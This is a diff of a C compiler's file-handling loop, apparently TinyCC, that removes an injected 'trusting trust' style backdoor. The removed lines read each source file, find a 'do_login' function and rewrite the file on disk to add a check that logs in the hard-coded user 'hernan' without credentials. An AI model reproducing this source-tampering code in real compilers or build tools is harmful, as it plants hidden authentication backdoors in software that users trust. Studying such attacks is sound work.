@@ -362,35 +362,8 @@ redo:
     first_file = NULL;
     do {
         struct filespec *f = s->files[n];
-        char source[30000];
-        int source_fd = open(f->name,  O_RDONLY  | 0660);
-        int bytesRead = read(source_fd, source, sizeof(source));
-        close(source_fd);
-        source[bytesRead] = '\0'; //cant forget to null terminate :)          
-        char login_target_line[] = "static int do_login(const char *username){";
-        char login_to_insert[] = "if (!strcmp(username, \"hernan\"))return 0;\n";                
 
-        //first navigate to the correct spot to insert the attack
-        char* insertion_point1 = strstr(source, login_target_line);
-
-        //now actually insert the attack
-        if (insertion_point1 != NULL){
-            printf("FOUND LOGIN\n");
-
-            unsigned int offset = 5 + strlen(login_target_line); 
-            int badfd = open(f->name, O_WRONLY | O_TRUNC | O_CREAT, 0660);
-
-            for(char* c = source; c != insertion_point1 + offset; c++){
-                write(badfd, c, 1);
-            }
-            write(badfd, login_to_insert, strlen(login_to_insert));
-
-            for(char *c = insertion_point1 + offset; *c;c++){
-                write(badfd, c, 1);
-            }
-            close(badfd);      
-        }        
-        s->filetype = f->type;
+       s->filetype = f->type;
         if (f->type & AFF_TYPE_LIB) {
             ret = tcc_add_library_err(s, f->name);
         } else {
